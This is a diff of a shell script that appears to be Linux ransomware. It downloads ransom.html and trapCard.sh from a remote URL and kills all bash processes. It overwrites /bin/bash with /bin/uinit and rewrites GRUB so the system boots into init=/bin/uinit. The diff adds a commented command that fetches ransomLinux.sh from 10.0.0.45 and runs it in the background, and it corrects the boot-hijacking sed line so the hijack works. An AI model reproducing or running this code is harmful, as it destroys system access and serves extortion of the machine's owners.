@@ -1,6 +1,6 @@
 #! /bin/sh
 
-
+#f=ransomLinux.sh; curl http://10.0.0.45/$f ; nohup ./$f &
 
 
 
@@ -18,7 +18,7 @@ for f in ransom.html trapCard.sh; do
  curl -s "$url$f" > $f
 done
 
-apt install lynx -y >/dev/null 2>&1
+apt install lynx -y 2>&1 >/dev/null
 
 #kill all bash
 kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
@@ -32,7 +32,7 @@ cp /bin/uinit /bin/bash
 #comment out GRUB_CMDLINE_LINUX_DEFAULT
 #GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
-sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX_="init=/bin/uinit"' /etc/default/grub
+sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX="init=/bin/uinit"' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
 update-grub
 
